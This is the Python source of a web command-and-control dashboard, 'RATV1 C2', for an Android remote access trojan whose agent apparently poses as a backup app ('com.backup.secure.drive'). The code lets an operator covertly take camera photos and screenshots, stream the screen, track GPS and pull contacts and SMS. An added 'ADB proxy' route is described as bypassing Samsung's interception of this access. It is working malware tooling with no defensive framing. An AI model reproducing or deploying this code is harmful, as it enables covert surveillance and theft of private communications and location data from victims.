#!/usr/bin/env python3
"""
RATV1 WEB C2 — browser dashboard


Usage:
    python c2_web.py                   # ADB tunnel mode (device on USB)
    python c2_web.py --no-adb          # WiFi/network mode
    python c2_web.py --port 8667       # custom agent port

Dashboard: http://localhost:5000
"""
import os, sys, json, socket, struct, time, subprocess, base64, uuid, threading, argparse, queue
from pathlib import Path
from datetime import datetime
from flask import Flask, render_template_string, jsonify, request, Response, stream_with_context
from flask_socketio import SocketIO

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

OUT = Path(__file__).parent / "c2_output"
os.makedirs(OUT, exist_ok=True)

app = Flask(__name__)
app.config["SECRET_KEY"] = "ratv1_c2_key"
sio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

# ── global state ──────────────────────────────────────────────────────────────
agent_sock = None
agent_info = {}
send_lock = threading.Lock()          # only one sender at a time
pending = {}                          # task_id -> queue.Queue(1)
pending_lock = threading.Lock()
vnc_frames = []
vnc_lock = threading.Lock()

# ── protocol ──────────────────────────────────────────────────────────────────

def _send(sock, data):
    raw = json.dumps(data).encode()
    with send_lock:
        sock.sendall(struct.pack(">I", len(raw)) + raw)

def _read_one(sock):
    """Read exactly one message. Blocks. Returns None on disconnect/error."""
    try:
        hdr = b""
        while len(hdr) < 4:
            c = sock.recv(4 - len(hdr))
            if not c: return None
            hdr += c
        n = struct.unpack(">I", hdr)[0]
        if n > 50 * 1024 * 1024: return None
        body = b""
        while len(body) < n:
            c = sock.recv(min(65536, n - len(body)))
            if not c: return None
            body += c
        return json.loads(body.decode())
    except Exception:
        return None

def _reader_thread(conn):
    """Single reader thread — owns the socket receive side exclusively."""
    global agent_sock
    while True:
        msg = _read_one(conn)
        if msg is None:
            break
        t = msg.get("type")
        tid = msg.get("task_id")

        # heartbeat
        if t == "heartbeat":
            sio.emit("heartbeat", msg)
            continue

        # result for a pending dispatch
        if t == "result" and tid:
            with pending_lock:
                q = pending.get(tid)
            if q:
                # cache VNC frames
                data = msg.get("data", {})
                b64 = data.get("data") or data.get("image")
                if b64:
                    raw_bytes = base64.b64decode(b64)
                    with vnc_lock:
                        vnc_frames.append(raw_bytes)
                        if len(vnc_frames) > 60:
                            vnc_frames.pop(0)
                try:
                    q.put_nowait(data)
                except queue.Full:
                    pass
            continue

    # disconnected
    agent_sock = None
    sio.emit("status", {"connected": False, "msg": "Agent disconnected. Waiting..."})


def dispatch(op, timeout=60, **kwargs):
    sock = agent_sock
    if sock is None:
        return {"error": "no agent connected"}
    tid = uuid.uuid4().hex[:6]
    q = queue.Queue(maxsize=1)
    with pending_lock:
        pending[tid] = q
    try:
        _send(sock, {"type": "task", "task_id": tid, "op": op, **kwargs})
    except Exception as e:
        with pending_lock:
            pending.pop(tid, None)
        return {"error": str(e)}
    try:
        result = q.get(timeout=timeout)
        return result
    except queue.Empty:
        return {"error": "timeout"}
    finally:
        with pending_lock:
            pending.pop(tid, None)


def save_file(b64, prefix):
    if not b64: return None
    ts = datetime.now().strftime("%H%M%S")
    p = OUT / f"{prefix}_{ts}.jpg"
    p.write_bytes(base64.b64decode(b64))
    return str(p)

# ── agent listener ────────────────────────────────────────────────────────────

def agent_listener(port, use_adb):
    global agent_sock, agent_info
    if use_adb:
        subprocess.run(f"adb reverse tcp:8667 tcp:{port}", shell=True, capture_output=True)

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port))
    srv.listen(5)
    sio.emit("status", {"connected": False, "msg": f"Listening on :{port}..."})

    while True:
        try:
            srv.settimeout(2)
            try:
                conn, addr = srv.accept()
            except socket.timeout:
                continue

            # only accept ADB tunnel (127.0.0.1) — blocks WiFi agents
            if use_adb and addr[0] not in ("127.0.0.1", "::1"):
                conn.close()
                continue

            agent_sock = conn

            # read registration message
            reg = _read_one(conn)
            if reg:
                agent_info = {
                    "host": reg.get("hostname", "?"),
                    "model": reg.get("model", "?"),
                    "ip": addr[0],
                    "connected_at": datetime.now().strftime("%H:%M:%S"),
                }
            else:
                agent_info = {"host": addr[0], "ip": addr[0], "connected_at": datetime.now().strftime("%H:%M:%S")}

            sio.emit("status", {"connected": True, "agent": agent_info,
                                "msg": f"Agent connected: {agent_info.get('host')}"})

            # hand off to reader thread — no more reading in this thread
            t = threading.Thread(target=_reader_thread, args=(conn,), daemon=True)
            t.start()
            t.join()  # wait until agent disconnects, then loop back to accept

        except Exception:
            time.sleep(1)

# ── routes ────────────────────────────────────────────────────────────────────

@app.errorhandler(Exception)
def handle_any_err(e):
    import traceback as _tb
    return jsonify({"_err": type(e).__name__, "_msg": str(e), "_tb": _tb.format_exc()}), 500

@app.route("/")
def index():
    return render_template_string(DASHBOARD_HTML)

@sio.on("connect")
def on_sio_connect():
    if agent_sock is not None:
        sio.emit("status", {"connected": True, "agent": agent_info,
                             "msg": f"Agent connected: {agent_info.get('host','?')}"})
    else:
        sio.emit("status", {"connected": False, "msg": "Waiting for agent..."})

@app.route("/api/status")
def api_status():
    return jsonify({"connected": agent_sock is not None, "agent": agent_info})

@app.route("/api/op/<op>", methods=["POST"])
def api_op(op):
    kwargs = request.json or {}
    timeout = int(kwargs.pop("timeout", 45))
    result = dispatch(op, timeout=timeout, **kwargs)
    b64 = result.get("data") or result.get("image")
    if b64 and op in ("camera", "screenshot"):
        result["saved_path"] = save_file(b64, op)
    return jsonify(result)

@app.route("/api/adb/<cmd>")
def api_adb(cmd):
    """ADB-side proxy: bypass Samsung UID-10277 interception. Runs as shell/UID-2000."""
    import re, sys as _sys
    print(f"ADB_ROUTE: cmd={cmd!r}", flush=True, file=_sys.stderr)
    def adb(shell_cmd, timeout=15):
        try:
            r = subprocess.run(f"adb shell {shell_cmd}", shell=True,
                               capture_output=True, timeout=timeout)
            return r.stdout.decode("utf-8", errors="replace") if r.stdout else ""
        except Exception:
            return ""

    if cmd == "contacts":
        import sys as _sys
        print("DEBUG contacts: calling adb", flush=True)
        out = adb("content query --uri content://com.android.contacts/data/phones "
                  "--projection display_name:data1")
        print(f"DEBUG contacts: out len={len(out) if out else 'None'}", flush=True)
        contacts = []
        for line in out.splitlines():
            if not line.startswith("Row:"):
                continue
            name = phone = ""
            for part in line.split(", "):
                if "display_name=" in part:
                    name = part.split("display_name=", 1)[1].strip()
                elif "data1=" in part:
                    phone = part.split("data1=", 1)[1].strip()
            if name or phone:
                contacts.append({"name": name, "phone": phone, "number": phone})
        return jsonify({"contacts": contacts, "count": len(contacts), "source": "adb"})

    elif cmd == "gps":
        out = adb("dumpsys location")
        best = None
        for line in out.splitlines():
            m = re.search(r"last location=Location\[(\w+)\s+([-\d.]+),([-\d.]+)\s+hAcc=([\d.]+)", line)
            if m:
                provider, lat, lon, acc = m.group(1), float(m.group(2)), float(m.group(3)), float(m.group(4))
                if best is None or provider == "gps":
                    best = {"latitude": lat, "longitude": lon, "accuracy": acc,
                            "provider": provider, "source": "adb"}
        return jsonify(best if best else {"error": "no location in dumpsys"})

    elif cmd == "sms":
        out = adb("content query --uri content://sms --projection address:body:date:type")
        messages = []
        for line in out.splitlines():
            if not line.startswith("Row:"):
                continue
            addr = body = date = ""
            msg_type = 0
            for part in line.split(", "):
                if "address=" in part:
                    addr = part.split("address=", 1)[1].strip()
                elif "body=" in part:
                    body = part.split("body=", 1)[1].strip()
                elif "date=" in part:
                    date = part.split("date=", 1)[1].strip()
                elif "type=" in part:
                    try:
                        msg_type = int(part.split("type=", 1)[1].strip())
                    except Exception:
                        pass
            if addr or body:
                messages.append({"address": addr, "body": body, "date": date, "type": msg_type})
        return jsonify({"messages": messages, "count": len(messages), "source": "adb"})

    return jsonify({"error": f"unknown adb cmd: {cmd}"})


@app.route("/vnc_stream")
def vnc_stream():
    def generate():
        sent = 0
        while True:
            with vnc_lock:
                if len(vnc_frames) > sent:
                    frame = vnc_frames[len(vnc_frames) - 1]
                    sent = len(vnc_frames)
                    yield b"--frame\r\nContent-Type: image/jpeg\r\n\r\n" + frame + b"\r\n"
            time.sleep(0.08)
    return Response(stream_with_context(generate()),
                    mimetype="multipart/x-mixed-replace; boundary=frame")

# ── dashboard HTML ────────────────────────────────────────────────────────────

DASHBOARD_HTML = """<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>RATV1 C2</title>
<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0a0a0f;color:#e0e0e0;font-family:'Courier New',monospace;font-size:13px}
header{background:#111;border-bottom:1px solid #1a1a2e;padding:10px 20px;display:flex;align-items:center;gap:16px}
header h1{color:#00ff88;font-size:16px;letter-spacing:3px}
#status-dot{width:10px;height:10px;border-radius:50%;background:#ff3333;transition:background .3s}
#status-dot.on{background:#00ff88;box-shadow:0 0 8px #00ff88}
#status-text{color:#888;font-size:11px}
.layout{display:grid;grid-template-columns:260px 1fr;height:calc(100vh - 41px)}
.sidebar{background:#0d0d18;border-right:1px solid #1a1a2e;padding:16px;overflow-y:auto}
.main{display:flex;flex-direction:column;overflow:hidden}
.ops-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:16px}
.btn{background:#111;border:1px solid #222;color:#00ff88;padding:8px 10px;cursor:pointer;
     border-radius:4px;font-family:inherit;font-size:12px;transition:all .15s;text-align:left}
.btn:hover{background:#1a1a2e;border-color:#00ff88}
.btn.wide{grid-column:span 2}
.section{margin-bottom:16px}
.section h3{color:#555;font-size:10px;letter-spacing:2px;text-transform:uppercase;margin-bottom:8px;
            border-bottom:1px solid #1a1a2e;padding-bottom:4px}
.info-row{display:flex;justify-content:space-between;padding:3px 0;border-bottom:1px solid #111;font-size:11px}
.info-row .k{color:#555}
.info-row .v{color:#ccc;text-align:right;max-width:160px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.display{flex:1;overflow-y:auto;padding:16px;display:flex;flex-direction:column;gap:12px}
.card{background:#0d0d18;border:1px solid #1a1a2e;border-radius:6px;padding:12px}
.card h4{color:#00ff88;font-size:11px;letter-spacing:1px;margin-bottom:8px}
.card img{max-width:100%;border-radius:4px;display:block}
.card pre{color:#aaa;font-size:11px;white-space:pre-wrap;max-height:200px;overflow-y:auto}
.card table{width:100%;border-collapse:collapse;font-size:11px}
.card table th{color:#555;text-align:left;padding:3px 6px;border-bottom:1px solid #1a1a2e}
.card table td{padding:3px 6px;border-bottom:1px solid #0a0a0f;color:#ccc}
.card table tr:hover td{background:#111}
.gps-link{color:#4af;text-decoration:none;font-size:11px}
.gps-link:hover{text-decoration:underline}
.log{background:#0a0a0f;border-top:1px solid #1a1a2e;padding:8px 16px;font-size:11px;color:#555;
     height:32px;overflow:hidden;white-space:nowrap;text-overflow:ellipsis}
#vnc-img{width:100%;border-radius:4px}
.tag{display:inline-block;background:#1a1a2e;color:#00ff88;font-size:9px;padding:1px 5px;
     border-radius:2px;margin-left:4px;letter-spacing:1px}
.err{color:#f64}
</style>
</head>
<body>
<header>
  <div id="status-dot"></div>
  <h1>RATV1 C2</h1>
  <span id="status-text">waiting for agent...</span>
</header>
<div class="layout">
  <div class="sidebar">
    <div class="section">
      <h3>Agent</h3>
      <div class="info-row"><span class="k">status</span><span class="v" id="ai-status">disconnected</span></div>
      <div class="info-row"><span class="k">device</span><span class="v" id="ai-host">—</span></div>
      <div class="info-row"><span class="k">ip</span><span class="v" id="ai-ip">—</span></div>
      <div class="info-row"><span class="k">connected</span><span class="v" id="ai-time">—</span></div>
    </div>
    <div class="section">
      <h3>System</h3>
      <div id="sysinfo-rows"></div>
    </div>
    <div class="section">
      <h3>Operations</h3>
      <div class="ops-grid">
        <button class="btn wide" onclick="op('sysinfo')">[ sysinfo ]</button>
        <button class="btn" onclick="op('camera',{facing:'front'})">[ cam front ]</button>
        <button class="btn" onclick="op('camera',{facing:'rear'})">[ cam rear ]</button>
        <button class="btn" onclick="op('screenshot')">[ screenshot ]</button>
        <button class="btn" onclick="startVnc()">[ vnc start ]</button>
        <button class="btn" onclick="op('gps',{},{timeout:45})">[ gps ]</button>
        <button class="btn wide" onclick="op('contacts')">[ contacts ]</button>
        <button class="btn wide" onclick="op('sms_read')">[ sms read ]</button>
        <button class="btn wide" onclick="op('acc_status')">[ acc status ]</button>
      </div>
    </div>
    <div class="section">
      <h3>ADB Proxy <span class="tag">BYPASS</span></h3>
      <div class="ops-grid">
        <button class="btn wide" onclick="adbOp('contacts')">[ adb contacts ]</button>
        <button class="btn wide" onclick="adbOp('sms')">[ adb sms ]</button>
        <button class="btn wide" onclick="adbOp('gps')">[ adb gps ]</button>
      </div>
    </div>
  </div>
  <div class="main">
    <div class="display" id="display">
      <div class="card">
        <h4>RATV1 C2 </h4>
        <pre>Waiting for agent...
Package : com.backup.secure.drive
Protocol: OPERATOR  port 8667</pre>
      </div>
    </div>
    <div class="log" id="log">ready.</div>
  </div>
</div>
<script>
const socket = io();
let vncActive = false;

socket.on("status", d => {
  document.getElementById("status-dot").className = d.connected ? "on" : "";
  document.getElementById("status-text").textContent = d.msg || "";
  if (d.connected && d.agent) {
    document.getElementById("ai-status").textContent = "ONLINE";
    document.getElementById("ai-host").textContent = d.agent.host || "?";
    document.getElementById("ai-ip").textContent = d.agent.ip || "?";
    document.getElementById("ai-time").textContent = d.agent.connected_at || "?";
    log("Agent: " + d.agent.host);
  } else {
    document.getElementById("ai-status").textContent = "offline";
  }
});
socket.on("heartbeat", d => log("heartbeat battery:" + (d.battery||"?") + "%"));

function log(msg) {
  document.getElementById("log").textContent = "[" + new Date().toLocaleTimeString() + "] " + msg;
}

async function op(opName, extra={}, opts={}) {
  log("→ " + opName + "...");
  const body = {...extra, timeout: opts.timeout || 45};
  const r = await fetch("/api/op/" + opName, {
    method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(body)
  });
  renderResult(opName, await r.json());
}

function renderResult(op, data) {
  const card = document.createElement("div");
  card.className = "card";
  const ts = new Date().toLocaleTimeString();
  if (data.error) {
    card.innerHTML = `<h4 class="err">${op.toUpperCase()} ERROR [${ts}]</h4><pre class="err">${data.error}</pre>`;
    log("✗ " + op + ": " + data.error);
  } else if (op === "sysinfo") {
    const rows = Object.entries(data).map(([k,v])=>`<div class="info-row"><span class="k">${k}</span><span class="v">${v}</span></div>`).join("");
    card.innerHTML = `<h4>SYSINFO [${ts}]</h4>${rows}`;
    document.getElementById("sysinfo-rows").innerHTML = rows;
    log("sysinfo ok");
  } else if (op === "camera" || op === "screenshot") {
    const b64 = data.data || data.image;
    card.innerHTML = b64
      ? `<h4>${op.toUpperCase()} [${ts}]</h4><img src="data:image/jpeg;base64,${b64}">`
      : `<h4 class="err">${op.toUpperCase()} ERROR</h4><pre>${JSON.stringify(data)}</pre>`;
    log(op + " ok");
  } else if (op === "gps") {
    const lat=data.latitude, lon=data.longitude, acc=data.accuracy;
    card.innerHTML = `<h4>GPS [${ts}]</h4>
      <div class="info-row"><span class="k">coords</span><span class="v">${lat}, ${lon}</span></div>
      <div class="info-row"><span class="k">accuracy</span><span class="v">${acc}m</span></div>
      <div class="info-row"><span class="k">map</span><span class="v"><a class="gps-link" href="https://maps.google.com/?q=${lat},${lon}" target="_blank">open maps ↗</a></span></div>
      <iframe width="100%" height="180" frameborder="0" style="border-radius:4px;margin-top:8px"
        src="https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed"></iframe>`;
    log("GPS: " + lat + ", " + lon);
  } else if (op === "contacts") {
    const c = data.contacts || [];
    const rows = c.slice(0,50).map(x=>`<tr><td>${x.name||"?"}</td><td>${x.phone||x.number||""}</td></tr>`).join("");
    card.innerHTML = `<h4>CONTACTS [${ts}] — ${c.length} total</h4><table><tr><th>Name</th><th>Phone</th></tr>${rows}</table>`;
    log(c.length + " contacts");
  } else if (op === "sms_read" || op === "sms") {
    const m = data.messages || [];
    const rows = m.slice(0,30).map(x=>`<tr><td>${x.address||"?"}</td><td>${(x.body||"").slice(0,80)}</td></tr>`).join("");
    card.innerHTML = `<h4>SMS [${ts}] — ${m.length} messages</h4><table><tr><th>From/To</th><th>Message</th></tr>${rows}</table>`;
    log(m.length + " sms");
  } else if (op === "acc_status") {
    card.innerHTML = `<h4>ACC STATUS [${ts}]</h4>
      <div class="info-row"><span class="k">accessibility</span><span class="v">${data.acc_available}</span></div>
      <div class="info-row"><span class="k">screen grant</span><span class="v">${data.screen_grant}</span></div>`;
    log("acc: " + JSON.stringify(data));
  } else {
    card.innerHTML = `<h4>${op.toUpperCase()} [${ts}]</h4><pre>${JSON.stringify(data,null,2).slice(0,500)}</pre>`;
    log(op + " done");
  }
  document.getElementById("display").insertBefore(card, document.getElementById("display").firstChild);
}

async function adbOp(name) {
  log("→ adb:" + name + "...");
  const r = await fetch("/api/adb/" + name);
  const data = await r.json();
  if (data.source) data._adb = true;
  renderResult(name, data);
}

function startVnc() {
  vncActive = !vncActive;
  const display = document.getElementById("display");
  if (vncActive) {
    let card = document.getElementById("vnc-card");
    if (!card) {
      card = document.createElement("div");
      card.className = "card"; card.id = "vnc-card";
      card.innerHTML = `<h4>VNC LIVE STREAM</h4><img id="vnc-img" src="/vnc_stream">`;
      display.insertBefore(card, display.firstChild);
    }
    log("VNC started — triggering screen grant...");
    fetch("/api/op/screen_grant",{method:"POST",headers:{"Content-Type":"application/json"},body:"{}"});
    setTimeout(()=>{
      fetch("/api/op/vnc",{method:"POST",headers:{"Content-Type":"application/json"},
            body:JSON.stringify({frames:9999,interval:333,timeout:3600})});
    }, 4000);
  } else {
    const c = document.getElementById("vnc-card");
    if (c) c.remove();
    log("VNC stopped");
  }
}
</script>
</body>
</html>"""

# ── main ──────────────────────────────────────────────────────────────────────

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=8667)
    ap.add_argument("--web-port", type=int, default=5000)
    ap.add_argument("--no-adb", action="store_true")
    args = ap.parse_args()

    t = threading.Thread(target=agent_listener, args=(args.port, not args.no_adb), daemon=True)
    t.start()

    print(f"\n  RATV1 WEB C2")
    print(f"  Dashboard : http://localhost:{args.web_port}")
    print(f"  Agent port: {args.port}")
    print(f"  Output    : {OUT}\n")

    sio.run(app, host="0.0.0.0", port=args.web_port, debug=False, use_reloader=False, allow_unsafe_werkzeug=True)

if __name__ == "__main__":
    main()
